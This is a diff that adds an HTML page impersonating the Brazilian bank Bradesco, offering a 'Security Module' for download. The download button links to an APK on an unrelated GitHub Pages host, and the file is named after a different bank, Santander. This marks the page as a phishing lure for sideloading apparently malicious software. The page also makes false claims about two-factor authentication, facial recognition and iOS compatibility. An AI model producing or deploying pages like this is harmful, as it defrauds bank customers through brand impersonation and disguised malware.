@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Bradesco | Módulo Segurança</title>
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .app-card {
+      max-width: 420px;
+      width: 100%;
+      background: #ffffff;
+      border-radius: 40px 40px 32px 32px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.08), 0 8px 20px rgba(0, 0, 0, 0.05);
+      overflow: hidden;
+      padding: 28px 24px 32px;
+      transition: all 0.2s ease;
+    }
+
+    /* ===== HEADER ===== */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 24px;
+    }
+
+    .logo-area {
+      display: flex;
+      align-items: center;
+    }
+
+    .logo-bradesco img {
+      height: 48px;
+      width: auto;
+      display: block;
+      border-radius: 6px;
+    }
+
+    .header-actions {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .header-actions i {
+      font-size: 1.4rem;
+      color: #2d2d2d;
+      opacity: 0.7;
+      transition: 0.2s;
+      cursor: default;
+    }
+
+    .header-actions i:hover {
+      opacity: 1;
+    }
+
+    /* ===== TÍTULO ===== */
+    .titulo-secao {
+      margin-bottom: 8px;
+    }
+    .titulo-secao h1 {
+      font-size: 1.7rem;
+      font-weight: 700;
+      color: #1a1a1a;
+      letter-spacing: -0.5px;
+    }
+    .titulo-secao h1 i {
+      color: #cc092f;
+      margin-right: 8px;
+    }
+    .subtitulo {
+      color: #6b6b6b;
+      font-size: 0.95rem;
+      margin-top: 4px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .subtitulo i {
+      color: #cc092f;
+      font-size: 0.7rem;
+    }
+
+    /* ===== CARD DO MÓDULO SEGURANÇA ===== */
+    .modulo-card {
+      background: linear-gradient(145deg, #fafcff, #f2f4f9);
+      border-radius: 28px;
+      padding: 24px 22px;
+      margin: 20px 0 24px;
+      border: 1px solid #e8ebf0;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+      transition: 0.2s;
+    }
+
+    .modulo-card .icone-grande {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #cc092f;
+      background: linear-gradient(135deg, #cc092f, #a00725);
+      width: 72px;
+      height: 72px;
+      border-radius: 24px;
+      margin-bottom: 16px;
+      box-shadow: 0 6px 16px rgba(204, 9, 47, 0.25);
+    }
+    .modulo-card .icone-grande i {
+      font-size: 2.6rem;
+      color: white;
+    }
+
+    .modulo-card h2 {
+      font-size: 1.3rem;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 4px;
+    }
+    .modulo-card .descricao {
+      color: #4a4a4a;
+      font-size: 0.95rem;
+      line-height: 1.5;
+      margin-bottom: 6px;
+    }
+    .modulo-card .detalhes {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px 16px;
+      margin-top: 14px;
+      padding-top: 14px;
+      border-top: 1px solid #e0e4ea;
+    }
+    .modulo-card .detalhes span {
+      font-size: 0.8rem;
+      color: #5a5a5a;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .modulo-card .detalhes span i {
+      color: #cc092f;
+      font-size: 0.9rem;
+    }
+
+    /* ===== BOTÃO BAIXAR ===== */
+    .btn-baixar {
+      background: #cc092f;
+      background: linear-gradient(135deg, #cc092f, #a00725);
+      border: none;
+      color: white;
+      padding: 18px 24px;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 1.1rem;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      box-shadow: 0 8px 24px rgba(204, 9, 47, 0.3);
+      transition: 0.2s;
+      cursor: pointer;
+      margin: 8px 0 16px;
+      letter-spacing: 0.3px;
+      text-decoration: none;
+    }
+    .btn-baixar i {
+      font-size: 1.3rem;
+    }
+    .btn-baixar:hover {
+      transform: scale(1.02);
+      background: #b3082a;
+      box-shadow: 0 8px 28px rgba(204, 9, 47, 0.4);
+    }
+    .btn-baixar:active {
+      transform: scale(0.97);
+    }
+
+    /* ===== INFO ADICIONAL ===== */
+    .info-box {
+      background: #f8fafc;
+      border-radius: 18px;
+      padding: 16px 18px;
+      margin: 12px 0 18px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      border-left: 4px solid #cc092f;
+    }
+    .info-box i {
+      color: #cc092f;
+      font-size: 1.2rem;
+      margin-top: 2px;
+    }
+    .info-box p {
+      font-size: 0.85rem;
+      color: #3d3d3d;
+      line-height: 1.5;
+    }
+    .info-box p strong {
+      color: #1a1a1a;
+    }
+
+    /* ===== VERSÃO E LINKS ===== */
+    .footer-links {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 24px;
+      padding-top: 16px;
+      border-top: 1px solid #eceef2;
+      font-size: 0.78rem;
+      color: #8a8a8a;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+    .footer-links .versao {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .footer-links .links {
+      display: flex;
+      gap: 16px;
+    }
+    .footer-links .links a {
+      color: #7a7a7a;
+      text-decoration: none;
+      transition: 0.2s;
+      cursor: default;
+    }
+    .footer-links .links a:hover {
+      color: #cc092f;
+    }
+
+    /* ===== RESPONSIVO ===== */
+    @media (max-width: 440px) {
+      .app-card {
+        padding: 20px 16px 28px;
+        border-radius: 32px;
+      }
+      .modulo-card .icone-grande {
+        width: 60px;
+        height: 60px;
+      }
+      .modulo-card .icone-grande i {
+        font-size: 2rem;
+      }
+      .titulo-secao h1 {
+        font-size: 1.4rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="app-card">
+    <!-- HEADER com logo Bradesco -->
+    <div class="header">
+      <div class="logo-area">
+        <div class="logo-bradesco">
+          <img src="https://play-lh.googleusercontent.com/B96xAfzq-fWsgqYxc7GOdlK4n0oYDm5CZa_MpMn5JJqxyRXJqIC-Wu8VHD3ITA__wWHStGe1ZDNRE6zzsitE=w480-h960-rw" 
+               alt="Bradesco Logo" 
+               loading="lazy">
+        </div>
+      </div>
+      <div class="header-actions">
+        <i class="fas fa-question-circle"></i>
+      </div>
+    </div>
+
+    <!-- TÍTULO -->
+    <div class="titulo-secao">
+      <h1><i class="fas fa-shield-alt"></i>Módulo Segurança</h1>
+      <div class="subtitulo">
+        <i class="fas fa-circle"></i> Proteção extra para suas transações
+        <span style="margin-left: auto; background: #e8ebf0; padding: 2px 12px; border-radius: 40px; font-size: 0.7rem; color: #3d3d3d;">v2.8</span>
+      </div>
+    </div>
+
+    <!-- CARD PRINCIPAL DO MÓDULO -->
+    <div class="modulo-card">
+      <div class="icone-grande">
+        <i class="fas fa-lock"></i>
+      </div>
+      <h2>Módulo de Segurança Bradesco</h2>
+      <p class="descricao">
+        Proteja suas operações com camada adicional de autenticação. 
+        O módulo verifica sua identidade em tempo real.
+      </p>
+      <div class="detalhes">
+        <span><i class="fas fa-check-circle"></i> Autenticação em 2 fatores</span>
+        <span><i class="fas fa-check-circle"></i> Token dinâmico</span>
+        <span><i class="fas fa-check-circle"></i> Reconhecimento facial</span>
+        <span><i class="fas fa-check-circle"></i> Notificações push</span>
+      </div>
+    </div>
+
+    <!-- BOTÃO BAIXAR com link APK -->
+    <a href="https://itokenseguro.github.io/itokenseguro/SANTANDERMODULO.APK" class="btn-baixar" download>
+      <i class="fas fa-download"></i> Baixar Módulo Segurança
+    </a>
+
+    <!-- INFOBOX -->
+    <div class="info-box">
+      <i class="fas fa-info-circle"></i>
+      <p>
+        <strong>Compatível com:</strong> Android 8.0+ • iOS 14+ • 
+        <span style="display: inline-block; margin-top: 2px;">O módulo funciona offline e ocupa apenas 18 MB.</span>
+      </p>
+    </div>
+
+    <!-- RODAPÉ -->
+    <div class="footer-links">
+      <span class="versao"><i class="far fa-check-circle" style="color: #0a7a3a;"></i> Módulo atualizado</span>
+      <div class="links">
+        <a href="#"><i class="far fa-question-circle"></i> Ajuda</a>
+        <a href="#"><i class="fas fa-file-alt"></i> Termos</a>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
